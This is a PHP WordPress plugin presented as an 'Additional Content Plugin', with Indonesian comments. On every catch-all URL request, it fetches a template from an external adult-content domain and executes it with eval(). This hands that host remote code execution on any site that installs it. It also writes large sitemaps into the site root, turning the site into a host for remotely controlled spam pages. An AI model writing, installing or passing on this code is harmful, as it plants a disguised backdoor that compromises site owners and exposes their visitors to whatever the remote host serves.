<?php
/*
Plugin Name: Additional Content Plugin
Description: Plugin untuk menampilkan konten tambahan dengan URL template dan JSON yang dinamis (Auto Generate & Auto Repair).
Version: 5.5
Author: Grok
*/

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// KONFIGURASI URL DEFAULT
define('ACP_TEMPLATE_URL', 'https://player.javpornsub.net/template/index.txt');
define('ACP_JSON_BASE_URL', 'https://player.javpornsub.net/content/');

// Register admin menu
add_action('admin_menu', 'acp_admin_menu');
function acp_admin_menu() {
    add_menu_page(
        'Additional Content Settings',
        'Content Plugin',
        'manage_options',
        'additional-content-plugin',
        'acp_admin_page',
        'dashicons-admin-page'
    );
}

// Generate random string
function acp_generate_random_string($length = 5) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $random_string = '';
    for ($i = 0; $i < $length; $i++) {
        $random_string .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $random_string;
}

// Admin page content
function acp_admin_page() {
    // Handle Reset
    if (isset($_POST['acp_reset'])) {
        if (!isset($_POST['_wpnonce']) || !wp_verify_nonce($_POST['_wpnonce'], 'acp_action')) {
            wp_die('Security check failed');
        }
        delete_option('acp_endpoints');
        echo '<div class="updated"><p>Pengaturan telah di-reset.</p></div>';
    }

    // Handle Setup (Input Jumlah Endpoint)
    if (isset($_POST['acp_setup_endpoints'])) {
        if (!isset($_POST['_wpnonce']) || !wp_verify_nonce($_POST['_wpnonce'], 'acp_action')) {
            wp_die('Security check failed');
        }

        $count = intval($_POST['endpoint_count']);
        if ($count > 0) {
            $new_endpoints = [];
            for ($i = 0; $i < $count; $i++) {
                $new_endpoints[] = [
                    'json_filename' => acp_generate_random_string(10), // Nama file JSON acak
                    'sitemap_name'  => acp_generate_random_string(5)   // Nama sitemap acak
                ];
            }
            update_option('acp_endpoints', $new_endpoints);
            echo '<div class="updated"><p>' . $count . ' Endpoint berhasil dibuat.</p></div>';
            
            acp_register_rewrite_rules();
            flush_rewrite_rules();
        }
    }

    // Handle Generate All Sitemaps
    $sitemap_results = [];
    if (isset($_POST['acp_generate_all_sitemaps'])) {
        if (!isset($_POST['_wpnonce']) || !wp_verify_nonce($_POST['_wpnonce'], 'acp_action')) {
            wp_die('Security check failed');
        }

        $endpoints = get_option('acp_endpoints', []);
        
        foreach ($endpoints as $ep) {
            // Pastikan json_filename ada sebelum generate
            if(empty($ep['json_filename'])) continue;

            $json_url = ACP_JSON_BASE_URL . $ep['json_filename'] . '.json';
            $result = acp_generate_sitemap($json_url, $ep['sitemap_name']);
            
            if (is_wp_error($result)) {
                $sitemap_results[] = [
                    'status' => 'error',
                    'msg' => "Gagal untuk " . $ep['json_filename'] . ": " . $result->get_error_message()
                ];
            } else {
                $sitemap_results[] = [
                    'status' => 'success',
                    'urls' => $result,
                    'json' => $ep['json_filename']
                ];
            }
        }
    }

    // Get current endpoints
    $endpoints = get_option('acp_endpoints', false);

    // === AUTO REPAIR LOGIC ===
    if ($endpoints !== false && is_array($endpoints)) {
        $is_dirty = false;
        foreach ($endpoints as &$ep) {
            if (!isset($ep['json_filename']) || empty($ep['json_filename'])) {
                $ep['json_filename'] = acp_generate_random_string(10);
                $is_dirty = true;
            }
            if (!isset($ep['sitemap_name']) || empty($ep['sitemap_name'])) {
                $ep['sitemap_name'] = acp_generate_random_string(5);
                $is_dirty = true;
            }
        }
        unset($ep);
        
        if ($is_dirty) {
            update_option('acp_endpoints', $endpoints);
        }
    }
    // === END AUTO REPAIR ===

    ?>
    <div class="wrap">
        <h1>Additional Content Plugin Settings</h1>

        <?php if ($endpoints === false || empty($endpoints)): ?>
            <div class="card" style="max-width: 500px; padding: 20px;">
                <h2>Langkah 1: Setup Endpoint</h2>
                <form method="post" action="">
                    <?php wp_nonce_field('acp_action'); ?>
                    <p>
                        <label for="endpoint_count">Berapa jumlah endpoint yang ingin dibuat?</label><br>
                        <input type="number" name="endpoint_count" id="endpoint_count" value="3" min="1" max="100" class="small-text">
                    </p>
                    <p class="submit">
                        <input type="submit" name="acp_setup_endpoints" class="button button-primary" value="Buat Endpoint">
                    </p>
                </form>
            </div>

        <?php else: ?>
            
            <?php if (!empty($sitemap_results)): ?>
                <div class="notice notice-success is-dismissible">
                    <h3>Hasil Generate Sitemap:</h3>
                    <ul>
                    <?php foreach ($sitemap_results as $res): ?>
                        <li>
                            <?php if ($res['status'] === 'error'): ?>
                                <span style="color:red;"><?php echo esc_html($res['msg']); ?></span>
                            <?php else: ?>
                                <strong>JSON: <?php echo esc_html($res['json']); ?>.json</strong><br>
                                <?php foreach ($res['urls'] as $idx => $url): 
                                    $xml_filename = basename($url);
                                    $unique_id = 'sitemap_res_' . md5($url . $idx);
                                ?>
                                    <div style="display: flex; align-items: center; gap: 5px; margin-bottom: 3px;">
                                        <a href="<?php echo esc_url($url); ?>" target="_blank"><?php echo esc_url($url); ?></a>
                                        <input type="text" id="<?php echo $unique_id; ?>" value="<?php echo esc_attr($xml_filename); ?>" style="position: absolute; left: -9999px;">
                                        <span class="dashicons dashicons-admin-page acp-copy-btn" 
                                              data-target="<?php echo $unique_id; ?>" 
                                              title="Copy Filename"
                                              style="cursor: pointer; color: #555; font-size: 18px;">
                                        </span>
                                        <span class="acp-copy-msg" style="display:none; color: green; font-size: 11px; font-weight: bold;">Copied!</span>
                                    </div>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </li>
                    <?php endforeach; ?>
                    </ul>
                </div>
            <?php endif; ?>

            <form method="post" action="">
                <?php wp_nonce_field('acp_action'); ?>
                
                <h2>Daftar Endpoint Aktif</h2>
                <p>Silakan buat file JSON dengan nama di bawah ini dan upload ke: <code><?php echo ACP_JSON_BASE_URL; ?></code></p>
                
                <table class="wp-list-table widefat fixed striped">
                    <thead>
                        <tr>
                            <th width="50">No</th>
                            <th>Nama JSON (Target URL)</th>
                            <th>Nama Sitemap (Output)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($endpoints as $index => $ep): ?>
                        <tr>
                            <td><?php echo $index + 1; ?></td>
                            <td>
                                <div style="display: flex; align-items: center;">
                                    <input type="text" id="json_file_<?php echo $index; ?>" value="<?php echo esc_attr($ep['json_filename']); ?>" class="regular-text" style="width: 200px;" readonly onclick="this.select();">
                                    <span style="margin-left: 5px; margin-right: 10px; font-weight: 500;">.json</span>
                                    <span class="dashicons dashicons-admin-page acp-copy-btn" 
                                          data-target="json_file_<?php echo $index; ?>" 
                                          title="Copy Filename Only"
                                          style="cursor: pointer; color: #0073aa; font-size: 20px;">
                                    </span>
                                    <span class="acp-copy-msg" style="display:none; margin-left: 8px; color: green; font-weight: bold; font-size: 12px;">Copied!</span>
                                </div>
                                <p class="description">URL: <?php echo ACP_JSON_BASE_URL . esc_html($ep['json_filename']) . '.json'; ?></p>
                            </td>
                            <td>
                                <code><?php echo esc_html($ep['sitemap_name']); ?>.xml</code>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>

                <p class="submit">
                    <input type="submit" name="acp_generate_all_sitemaps" class="button button-primary button-hero" value="Create Sitemap (Generate All)">
                </p>
            </form>

            <hr>
            <form method="post" action="" onsubmit="return confirm('Yakin ingin hapus semua dan mulai dari awal?');">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_reset" class="button button-secondary" value="Reset / Hapus Semua Endpoint">
            </form>

        <?php endif; ?>
    </div>

    <script>
        jQuery(document).ready(function($) {
            $('.acp-copy-btn').click(function() {
                var targetId = $(this).data('target');
                var copyText = document.getElementById(targetId);
                
                copyText.select();
                copyText.setSelectionRange(0, 99999);

                try {
                    if (navigator.clipboard) {
                        navigator.clipboard.writeText(copyText.value).then(function() {
                            showSuccess($(this));
                        }.bind(this));
                    } else {
                        document.execCommand("copy");
                        showSuccess($(this));
                    }
                } catch (err) {
                    document.execCommand("copy");
                    showSuccess($(this));
                }
                
                function showSuccess(element) {
                    var msg = element.siblings('.acp-copy-msg');
                    msg.fadeIn(200).delay(1000).fadeOut(200);
                }
            });
        });
    </script>
    <?php
}

// Rewrite Rules
add_action('init', 'acp_register_rewrite_rules');
function acp_register_rewrite_rules() {
    add_rewrite_rule('^([^/]+)/?$', 'index.php?acp_value=$matches[1]', 'top');
}

add_filter('query_vars', 'acp_query_vars');
function acp_query_vars($vars) {
    $vars[] = 'acp_value';
    return $vars;
}

// Sitemap Generator
function acp_generate_sitemap($konten_json_url, $sitemap_name) {
    $response = wp_remote_get($konten_json_url, ['timeout' => 30]);
    if (is_wp_error($response)) {
        return new WP_Error('fetch_error', 'Gagal mengambil JSON: ' . $response->get_error_message());
    }

    $body = wp_remote_retrieve_body($response);
    $konten_data = json_decode($body, true);

    if (json_last_error() !== JSON_ERROR_NONE || !is_array($konten_data)) {
        return new WP_Error('json_error', 'Format JSON tidak valid atau kosong.');
    }

    $max_urls_per_sitemap = 45000;
    $sitemap_urls = [];
    $konten_chunks = array_chunk($konten_data, $max_urls_per_sitemap, true);

    $base_path = ABSPATH;
    if (!is_writable(ABSPATH)) {
        $upload_dir = wp_upload_dir();
        $base_path = $upload_dir['basedir'] . '/';
    }

    foreach ($konten_chunks as $index => $chunk) {
        $xml = '<?xml version="1.0" encoding="UTF-8"?>';
        $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
        foreach ($chunk as $title => $content) {
            $url = esc_url(home_url(urlencode($title)));
            $xml .= '<url><loc>' . $url . '</loc><lastmod>' . current_time('c') . '</lastmod><changefreq>weekly</changefreq></url>';
        }
        $xml .= '</urlset>';

        $filename = $index === 0 ? $sitemap_name . '.xml' : $sitemap_name . '-' . ($index + 1) . '.xml';
        $file_path = $base_path . $filename;

        if (file_put_contents($file_path, $xml) !== false) {
            $sitemap_urls[] = home_url($filename);
        }
    }
    return $sitemap_urls;
}

// Frontend Display
add_action('template_redirect', 'acp_handle_content_display');
function acp_handle_content_display() {
    $value = get_query_var('acp_value');
    if (empty($value)) return;

    $endpoints = get_option('acp_endpoints', []);
    if (empty($endpoints)) return;

    $title = sanitize_text_field(urldecode($value));

    // Cek post asli WP dulu
    if (get_page_by_path($title, OBJECT, ['post', 'page'])) return;

    foreach ($endpoints as $endpoint) {
        if(empty($endpoint['json_filename'])) continue;

        $konten_json_url = ACP_JSON_BASE_URL . $endpoint['json_filename'] . '.json';
        $cache_key = 'acp_konten_' . md5($konten_json_url);
        $konten_data = get_transient($cache_key);

        if ($konten_data === false) {
            $json_response = wp_remote_get($konten_json_url, ['timeout' => 10]);
            if (!is_wp_error($json_response)) {
                $konten_data = json_decode(wp_remote_retrieve_body($json_response), true);
                if (is_array($konten_data)) {
                    set_transient($cache_key, $konten_data, HOUR_IN_SECONDS);
                }
            }
        }

        if (is_array($konten_data)) {
            foreach ($konten_data as $key => $content_val) {
                if (strtolower($key) === strtolower($title)) {
                    
                    // === PERBAIKAN PENTING DI SINI ===
                    // Mendefinisikan variabel $additional_content agar bisa dibaca oleh template
                    $additional_content = $content_val;
                    // =================================

                    $template_response = wp_remote_get(ACP_TEMPLATE_URL, ['timeout' => 15]);
                    if (!is_wp_error($template_response)) {
                        $template_content = wp_remote_retrieve_body($template_response);
                        if (!empty($template_content)) {
                            ob_start();
                            // Variabel $additional_content sekarang tersedia di dalam eval()
                            eval('?>' . $template_content);
                            echo ob_get_clean();
                            exit;
                        }
                    }
                }
            }
        }
    }
    
    global $wp_query;
    $wp_query->set_404();
    status_header(404);
    get_template_part(404);
    exit;
}
